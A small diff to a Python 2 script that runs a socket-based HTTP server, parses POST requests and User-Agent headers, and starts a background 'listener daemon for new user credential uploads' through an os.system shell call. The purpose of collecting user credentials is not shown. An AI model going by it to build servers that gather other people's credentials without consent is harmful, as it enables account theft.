@@ -68,6 +68,7 @@ def run(handler):
             elif 'GET /favicon.ico HTTP/1.1' in request.split('\r\n'):
                 time.sleep(0.1)
             elif 'POST / HTTP/1.1' in request.split('\r\n'):
+                user_agent = ''
                 for ln in request.split('\r\n'):
                     if 'User-Agent:' in ln.split(':'):
                         try:
@@ -122,7 +123,7 @@ if __name__ == '__main__':
     print users
 
     # Start listener daemon for new user credential uploads
-    os.system('$(python engine.py -l 10000)&')
+    os.system('$(python engine.py -l 10000) &')
 
     # Start Server
     runtime = 3600
